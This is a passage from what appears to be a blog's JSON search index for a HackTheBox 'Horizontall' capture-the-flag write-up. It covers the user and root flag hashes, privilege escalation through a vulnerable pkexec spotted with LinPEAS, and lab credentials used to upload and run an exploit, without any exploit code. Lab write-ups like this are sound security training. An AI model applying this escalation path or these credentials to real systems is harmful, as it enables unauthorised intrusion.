","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:4:2","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"4.3 User Flag User Flag 1e76ca9ddad1b45992f9701539d9ce9b ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:4:3","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"5. Privilege Escalation pkexec vulnerable using Linpeas LinPEAS output ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:5:0","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"5.1 Exploit Exploit used Uploaded file using the strapi panel (credentials from Foothold exploit admin:SuperSecretPassword1) Compile the exploit Compiling the exploit Execute exploit Executing the exploit ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:6:0","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"},{"categories":["Linux Easy"],"content":"5.2 Root Flag Et voila Hehehe! And all this you were busy thinking we wouldn't be able to do this # cat root.txt e1581bd68329ddd2aacdfb01631ab02d ","date":"2022-02-04","objectID":"https://www.yashhacksstuff.tech/firstpost/:7:0","tags":["Easy","Linux","Retired"],"title":"HTB Horizontall Writeup","uri":"https://www.yashhacksstuff.tech/firstpost/"}]